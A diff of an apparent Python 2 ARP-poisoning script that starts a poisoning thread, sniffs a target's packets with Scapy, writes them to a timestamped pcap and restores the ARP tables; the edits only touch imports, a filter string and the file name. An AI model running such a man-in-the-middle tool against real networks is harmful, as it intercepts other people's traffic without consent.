@@ -4,7 +4,8 @@ import sys
 import threading
 import signal
 import getopt
-import datetime
+from time import gmtime , strftime
+import time
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
@@ -79,7 +80,7 @@ except getopt.GetoptError as err:
 interface = ""
 target_ip = ""
 gateway_ip = ""
-packet_count = 100
+packet_count = int(100)
 
 for o,a in opts:
 	if o in ("-i","--interface"):
@@ -120,12 +121,11 @@ posion_thread.start()
 try:
 	print "[*] Start sniffer for %d packets" % packet_count
 
-	bpf_filter = "ip host %s " % target_ip
+	bpf_filter = "ip host %s" % target_ip
 
 	packets = sniff(count= packet_count, filter= bpf_filter, iface= interface)
-	t = datetime.datetime.now()
-	packet_name = 'arp-%s-%s-%s-%s-%s.pcap' % (str(t.year),str(t.month),str(t.day),str(t.hour),str(t.minute))
-	wrpcap(packet_name,packets)
+	savename= "%s.pcap" % strftime("%Y-%m-%d,%H:%M", gmtime())
+	wrpcap(savename,packets)
 
 	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 except KeyboardInterrupt:
